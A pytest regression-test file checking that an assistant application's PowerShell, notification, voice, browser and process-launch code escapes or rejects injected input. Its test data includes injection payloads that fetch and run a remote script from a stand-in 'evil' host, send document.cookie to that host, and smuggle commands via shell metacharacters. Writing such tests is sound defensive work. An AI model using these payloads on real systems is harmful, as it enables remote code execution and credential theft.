"""Regression tests for the v31 command/script injection fixes.

Each case below was a working injection before v31, because a caller-supplied
string was concatenated into a shell/PowerShell/JavaScript program instead of
being passed as data:

* ``core/action_executor.py`` — ``Start-Process '{name}'``
* ``core/commands/notify.py`` — title/message into a double-quoted PS string
* ``core/commands/voice.py``  — ``Speak('{text}')``
* ``core/web/browser.py``     — ``localStorage.getItem('{key}')``
* ``core/commands/process.py``— ``Popen(["start", "", name], shell=True)``
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from core.powershell import _ps_escape_single_quoted

# A quote closes the literal; everything after it would execute.
PS_BREAKOUT = "notepad'; Start-Process calc; '"
PS_BREAKOUT_2 = "x' ; iwr http://evil/e.ps1 | iex ; '"


# ---------------------------------------------------------------------------
# The shared escaper
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    [PS_BREAKOUT, PS_BREAKOUT_2, "it's", "a'b'c", "'", "''", "$(calc)", "`whoami`", "a;b|c&d"],
)
def test_escaper_produces_a_closed_literal(raw):
    quoted = _ps_escape_single_quoted(raw)
    assert quoted.startswith("'") and quoted.endswith("'")
    # Every interior quote is doubled, so the literal cannot terminate early.
    interior = quoted[1:-1]
    assert interior.replace("''", "") .count("'") == 0


@pytest.mark.parametrize("bad", ["a\nb", "a\rb", "a\x00b"])
def test_escaper_rejects_control_characters(bad):
    with pytest.raises(ValueError):
        _ps_escape_single_quoted(bad)


# ---------------------------------------------------------------------------
# smart_open  (core/action_executor.py)
# ---------------------------------------------------------------------------


def _executor():
    from core.action_executor import ActionExecutor

    return ActionExecutor()


@pytest.mark.parametrize("evil", [PS_BREAKOUT, PS_BREAKOUT_2, "it's"])
def test_smart_open_neutralises_quotes(evil):
    """The name must reach PowerShell as a single quoted literal."""
    with patch("core.launcher.smart_open", return_value={"success": False}), patch(
        "subprocess.Popen"
    ) as popen:
        _executor()._smart_open(name=evil)

    assert popen.called
    argv = popen.call_args[0][0]
    command = argv[-1]
    assert command.startswith("Start-Process '")
    # The injected payload must be inside the literal, not after it.
    assert command == f"Start-Process {_ps_escape_single_quoted(evil)}"
    assert command.count("'") % 2 == 0


@pytest.mark.parametrize("evil", ["calc\nStart-Process evil", "a\r\nb", "x\x00y"])
def test_smart_open_rejects_control_characters(evil):
    with patch("core.launcher.smart_open", return_value={"success": False}), patch(
        "subprocess.Popen"
    ) as popen:
        result = _executor()._smart_open(name=evil)
    assert result["success"] is False
    assert result["error"] == "unsafe_app_name"
    assert not popen.called, "spawned PowerShell with a control character in the name"


def test_smart_open_still_works_for_normal_names():
    with patch("core.launcher.smart_open", return_value={"success": False}), patch(
        "subprocess.Popen"
    ) as popen:
        result = _executor()._smart_open(name="notepad")
    assert result["success"] is True
    assert popen.call_args[0][0][-1] == "Start-Process 'notepad'"


def test_smart_open_requires_approval():
    """smart_open launches arbitrary programs, so it must be approval-gated."""
    from core.action_executor import STATE_CHANGING_ACTIONS
    from core.engine import APPROVAL_REQUIRED_ACTIONS

    assert "smart_open" in STATE_CHANGING_ACTIONS
    assert "smart_open" in APPROVAL_REQUIRED_ACTIONS


# ---------------------------------------------------------------------------
# notify  (core/commands/notify.py)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "title,message",
    [
        ('x"; Start-Process calc; "', "hello"),
        ("hi", 'y"; iex(iwr http://evil/x); "'),
        ("$(calc)", "$(whoami)"),
        ("it's", "don't"),
    ],
)
def test_notify_neutralises_injection(title, message):
    from core.commands.notify import NotifyCommands

    with patch("core.commands.notify.platform.system", return_value="Windows"), patch(
        "core.commands.notify.subprocess.Popen"
    ) as popen:
        result = NotifyCommands().send(title, message)

    assert result.success is True
    ps_cmd = popen.call_args[0][0][-1]
    # Values appear only as single-quoted literals.
    assert f"$n.BalloonTipTitle={_ps_escape_single_quoted(title)}" in ps_cmd
    assert f"$n.BalloonTipText={_ps_escape_single_quoted(message)}" in ps_cmd
    # No bare double-quoted interpolation of the payload remains.
    assert f'"{title}"' not in ps_cmd or title == ""


@pytest.mark.parametrize("bad", ["a\nb", "a\r\nb"])
def test_notify_rejects_control_characters(bad):
    from core.commands.notify import NotifyCommands

    with patch("core.commands.notify.platform.system", return_value="Windows"), patch(
        "core.commands.notify.subprocess.Popen"
    ) as popen:
        result = NotifyCommands().send(bad, "msg")
    assert result.success is False
    assert not popen.called


# ---------------------------------------------------------------------------
# voice / SAPI  (core/commands/voice.py)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("evil", ["hi'); Start-Process calc; ('", "it's fine", "'"])
def test_voice_speak_neutralises_injection(evil):
    from core.commands.voice import VoiceCommands

    vc = VoiceCommands.__new__(VoiceCommands)
    vc.tts_engine = "sapi"
    vc.stt_engine = "none"

    with patch("core.commands.voice.subprocess.Popen") as popen:
        result = vc.speak(evil)

    assert result.success is True
    ps_cmd = popen.call_args[0][0][-1]
    assert f".Speak({_ps_escape_single_quoted(evil)})" in ps_cmd
    assert ps_cmd.count("'") % 2 == 0


def test_voice_speak_rejects_control_characters():
    from core.commands.voice import VoiceCommands

    vc = VoiceCommands.__new__(VoiceCommands)
    vc.tts_engine = "sapi"
    vc.stt_engine = "none"
    with patch("core.commands.voice.subprocess.Popen") as popen:
        result = vc.speak("a\nStart-Process calc")
    assert result.success is False
    assert not popen.called


def test_stt_detection_lookup_has_no_leading_space():
    """`shutil.which(" pocketsphinx_continuous")` could never match."""
    from core.commands.voice import VoiceCommands

    vc = VoiceCommands.__new__(VoiceCommands)
    seen = []

    def _which(name):
        seen.append(name)
        return None

    with patch("core.commands.voice.shutil.which", _which):
        assert vc._detect_stt_engine() == "none"

    assert "pocketsphinx_continuous" in seen
    for name in seen:
        assert name == name.strip(), f"which() called with untrimmed name {name!r}"


def test_stt_detection_finds_pocketsphinx():
    from core.commands.voice import VoiceCommands

    vc = VoiceCommands.__new__(VoiceCommands)
    with patch(
        "core.commands.voice.shutil.which",
        lambda n: "/usr/bin/pocketsphinx_continuous" if n == "pocketsphinx_continuous" else None,
    ):
        assert vc._detect_stt_engine() == "pocketsphinx"


# ---------------------------------------------------------------------------
# browser localStorage  (core/web/browser.py)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "evil_key",
    [
        "x'); fetch('//evil/'+document.cookie); ('",
        "a'+document.cookie+'b",
        "it's",
        "'",
    ],
)
def test_get_local_storage_passes_key_as_an_argument(evil_key):
    """The key must be an evaluate() argument, never spliced into the JS."""
    from core.web.browser import BrowserController

    browser = BrowserController.__new__(BrowserController)
    page = MagicMock()
    page.evaluate.return_value = "value"
    browser._page = page

    assert browser.get_local_storage(evil_key) == "value"

    args, _ = page.evaluate.call_args
    script = args[0]
    assert evil_key not in script, "key was interpolated into the JS source"
    assert args[1] == evil_key, "key was not passed as an evaluate() argument"
    assert script == "(k) => localStorage.getItem(k)"


# ---------------------------------------------------------------------------
# open_application fallback  (core/commands/process.py)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("evil", ["foo & calc", "a | whoami", "x > out.txt", 'q"r', "a^b", "a\nb"])
def test_open_application_fallback_rejects_shell_metacharacters(evil):
    from core.commands.process import ProcessCommands

    with patch("core.commands.process.platform.system", return_value="Windows"), patch(
        "core.commands.process.os.startfile", side_effect=OSError("nope"), create=True
    ), patch("core.commands.process.subprocess.Popen") as popen:
        result = ProcessCommands().open_application(evil)

    assert result.success is False
    assert "Unsafe application name" in result.message
    assert not popen.called


def test_open_application_fallback_does_not_use_a_shell():
    from core.commands.process import ProcessCommands

    with patch("core.commands.process.platform.system", return_value="Windows"), patch(
        "core.commands.process.os.startfile", side_effect=OSError("nope"), create=True
    ), patch("core.commands.process.subprocess.Popen") as popen:
        result = ProcessCommands().open_application("notepad")

    assert result.success is True
    argv = popen.call_args[0][0]
    kwargs = popen.call_args[1]
    assert kwargs.get("shell") is False, "shell=True flattens argv and reaches cmd"
    assert argv[:3] == ["cmd.exe", "/c", "start"]
    assert argv[-1] == "notepad"
